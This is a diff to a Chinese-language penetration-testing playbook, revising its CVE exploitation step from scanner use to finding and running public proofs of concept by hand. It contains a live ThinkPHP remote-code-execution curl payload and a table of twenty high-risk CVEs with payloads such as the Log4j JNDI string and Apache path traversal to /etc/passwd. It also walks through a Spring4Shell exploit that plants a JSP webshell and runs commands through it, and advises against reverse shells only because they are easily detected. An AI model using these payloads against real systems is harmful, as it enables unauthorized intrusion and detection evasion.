@@ -153,44 +153,198 @@ Nginx|1.18.0
 
 ### 阶段2: 漏洞发现
 
-#### 第3步：CVE精准打击（15分钟）⚡
+#### 第3步：CVE精准打击（30分钟）⚡ **完全手动验证**
 
-**目标：** 利用已知CVE快速突破
+**目标：** 利用已知CVE快速突破（手动查找+手动验证，0误报）
 
-**工具自动化：**
+**⚠️ 重要原则：**
+- ❌ **不使用nuclei扫CVE**（误报率99%，全是垃圾）
+- ✅ **手动查找CVE** → GitHub搜POC → 逐个手动验证
+- ✅ **只记录真正能复现的**
+
+---
+
+**方法1：使用CVE手动猎人脚本**
+
 ```bash
-# 方法1: CVE自动匹配（使用cve_matcher.py）
-python3 cve_matcher.py product_versions.txt > cve_results.txt
+# 生成查找指南
+chmod +x cve_manual_hunter.sh
+./cve_manual_hunter.sh $TARGET product_versions.txt
 
-# 方法2: nuclei CVE扫描
-cat final_targets.txt | awk '{print $1}' | \
-    nuclei -t ~/nuclei-templates/cves/ \
-    -severity critical,high -c 50 -silent -o nuclei_cve.txt
+# 输出：
+# - 每个产品的搜索命令（search_commands.txt）
+# - 常见产品已知CVE速查表（known_cves_guide.txt）
+# - 结果记录模板（cve_confirmed.txt等）
 
-# 方法3: 针对特定产品
+cd cve_manual_*/
+```
+
+---
+
+**方法2：手动查找CVE（5种途径）**
+
+```bash
+# 假设识别到：Spring Framework 5.3.17
+
+# 途径1: NVD官网
+浏览器打开: https://nvd.nist.gov/vuln/search/results?query=Spring+5.3.17
+
+# 途径2: Exploit-DB
+searchsploit Spring Framework 5.3
+
+# 途径3: GitHub搜索POC
+gh search repos "Spring Framework CVE-2022" --sort stars
+# 或浏览器: https://github.com/search?q=Spring+5.3+CVE+RCE
+
+# 途径4: Google Dorks
+site:github.com Spring Framework 5.3 CVE RCE exploit
+
+# 途径5: 已知CVE速查表（见下方）
+cat known_cves_guide.txt | grep -A 5 "Spring"
+```
+
+---
+
+**方法3：针对特定产品的专用扫描器**
+
+```bash
+# WordPress（WPScan准确率高，可以用）
 if grep -q "WordPress" product_versions.txt; then
-    wpscan --url $TARGET --enumerate vp --api-token $WPSCAN_API_KEY
+    wpscan --url $TARGET --enumerate vp --api-token $WPSCAN_API_KEY -o wpscan.json
+    # 只关注有POC的
+    cat wpscan.json | jq '.vulnerabilities[] | select(.references.url != null)'
 fi
 
-if grep -q "Spring" product_versions.txt; then
-    nuclei -u $TARGET -t ~/nuclei-templates/cves/2022/CVE-2022-22965.yaml
+# Joomla
+if grep -q "Joomla" product_versions.txt; then
+    joomscan -u $TARGET
+fi
+
+# Drupal
+if grep -q "Drupal" product_versions.txt; then
+    droopescan scan drupal -u $TARGET
+fi
+
+# ThinkPHP（直接POC）
+if grep -q "ThinkPHP" product_versions.txt; then
+    curl "$TARGET/index.php?s=captcha" -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
 fi
 ```
 
-**⏸️ 人工检查点3：CVE验证**
+---
+
+**常见高危CVE速查（Top 20）**
+
+| 产品 | 版本 | CVE | 类型 | 验证方法 |
+|------|------|-----|------|---------|
+| **Spring** | 5.3.0-5.3.17 | CVE-2022-22965 | RCE | `python3 Spring4Shell-POC.py` |
+| **Spring Cloud** | 3.0.0-3.0.6 | CVE-2022-22947 | RCE | SpEL注入 `/actuator/gateway/routes` |
+| **Log4j** | 2.0-2.14.1 | CVE-2021-44228 | RCE | `${jndi:ldap://dnslog/a}` |
+| **Apache** | 2.4.49 | CVE-2021-41773 | 路径穿越 | `/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` |
+| **Apache** | 2.4.50 | CVE-2021-42013 | RCE | 路径穿越+RCE |
+| **Tomcat** | 9.0.0-9.0.30 | CVE-2020-1938 | 文件读取 | Ghostcat AJP |
+| **Struts2** | 2.0-2.5.16 | CVE-2017-5638 | RCE | OGNL注入 |
+| **Confluence** | <7.18.1 | CVE-2022-26134 | RCE | OGNL注入 |
+| **Confluence** | 8.0-8.5.3 | CVE-2023-22515 | 权限提升 | 创建管理员 |
+| **GitLab** | 11.9-13.10.2 | CVE-2021-22205 | RCE | ExifTool |
+| **Jenkins** | 未授权 | - | RCE | `/script` 脚本控制台 |
+| **Redis** | <6.2.7 | CVE-2022-0543 | RCE | Lua沙箱逃逸 |
+| **Redis** | 未授权 | - | RCE | 写WebShell/SSH/Cron |
+| **ActiveMQ** | <5.18.3 | CVE-2023-46604 | RCE | 默认61616端口 |
+| **Laravel** | <8.4.2 | CVE-2021-3129 | RCE | Debug模式 |
+| **ThinkPHP** | 5.x | CVE-2018-20062 | RCE | `?s=captcha` |
+| **FastJson** | <1.2.68 | - | RCE | 反序列化 |
+| **Weblogic** | 多版本 | CVE-2019-2725 | RCE | 反序列化 |
+| **Drupal** | 7.x, 8.x | CVE-2018-7600 | RCE | Drupalgeddon2 |
+| **Elasticsearch** | 未授权 | - | 数据泄露 | `:9200/_cat/indices` |
+
+---
+
+**⏸️ 人工检查点3：CVE手动验证**
 
 ```bash
-# 查看所有CVE
-cat nuclei_cve.txt cve_results.txt
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "⏸️  【人工检查点3】CVE手动验证"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "📋 手动验证流程（每个CVE都要做）："
+echo ""
+echo "1️⃣ 找到CVE后，搜索GitHub POC"
+echo "   gh search repos \"CVE-2022-22965\" --sort stars"
+echo "   # 选择stars最多的"
+echo ""
+echo "2️⃣ 下载POC"
+echo "   git clone https://github.com/user/CVE-2022-22965-POC"
+echo "   cd CVE-2022-22965-POC"
+echo ""
+echo "3️⃣ 阅读README，了解："
+echo "   - 影响版本范围（是否完全匹配）"
+echo "   - 利用条件（是否满足）"
+echo "   - 验证方法"
+echo ""
+echo "4️⃣ 先用安全方式验证（不要直接getshell）"
+echo "   # 好的验证方式："
+echo "   curl TARGET  # 读取文件"
+echo "   curl TARGET  # 执行whoami/hostname"
+echo "   curl TARGET  # DNSLOG回显"
+echo ""
+echo "   # ❌ 不好的验证："
+echo "   直接反弹shell（容易被检测）"
+echo ""
+echo "5️⃣ 确认能复现后记录"
+echo "   echo \"target.com|CVE-2022-22965|Spring 5.3.17|RCE|https://github.com/xxx|已验证whoami\" >> cve_confirmed.txt"
+echo ""
+echo "6️⃣ 如果不work，分析原因"
+echo "   - 版本不完全匹配？"
+echo "   - 缺少利用条件？（如需要Tomcat环境）"
+echo "   - POC本身有问题？（试试其他POC）"
+echo "   - 已打补丁？"
+echo "   → 记录到 cve_false_positive.txt"
+echo ""
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "🔥 示例：Spring4Shell验证"
+echo ""
+echo "# 1. 下载POC"
+echo "git clone https://github.com/reznok/Spring4Shell-POC"
+echo ""
+echo "# 2. 查看版本是否匹配"
+echo "# 影响: Spring 5.3.0-5.3.17, 5.2.0-5.2.19"
+echo "# 条件: JDK 9+, Tomcat"
+echo ""
+echo "# 3. 运行POC（先测试）"
+echo "python3 exploit.py -u https://target.com"
+echo ""
+echo "# 4. 验证WebShell"
+echo "curl https://target.com/tomcatwar.jsp?pwd=j&cmd=whoami"
+echo ""
+echo "# 5. 如果成功"
+echo "echo \"target.com|CVE-2022-22965|Spring 5.3.17|RCE|已确认执行whoami\" >> cve_confirmed.txt"
+echo ""
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+```
 
-# 手动验证每个CVE
-# 示例：Spring4Shell验证
-curl -X POST "$TARGET/path" \
-    -H "Content-Type: application/x-www-form-urlencoded" \
-    -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i test&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+---
 
-# 确认后记录
-echo "target.com|CVE-2022-22965|Spring4Shell|已确认RCE" >> cve_confirmed.txt
+**验证结果分类：**
+
+```bash
+# ✅ 确认可利用（真正能复现的）
+cat > cve_confirmed.txt << 'EOF'
+target.com|CVE-2022-22965|Spring 5.3.17|RCE|https://github.com/reznok/Spring4Shell-POC|已执行whoami
+target.com|CVE-2021-44228|Log4j 2.14.0|RCE|DNSLOG收到回显
+EOF
+
+# ❌ 误报（不能复现）
+cat > cve_false_positive.txt << 'EOF'
+target.com|CVE-2021-41773|Apache 2.4.49|实际版本2.4.51，已修复
+target.com|CVE-2022-22947|Spring Cloud|缺少actuator端点
+EOF
+
+# ⏳ 需进一步验证
+cat > cve_needs_verify.txt << 'EOF'
+target.com|CVE-2020-1938|Tomcat 9.0.30|需要确认AJP端口8009是否开放
+EOF
 ```
 
 **🚀 快速通道触发：**
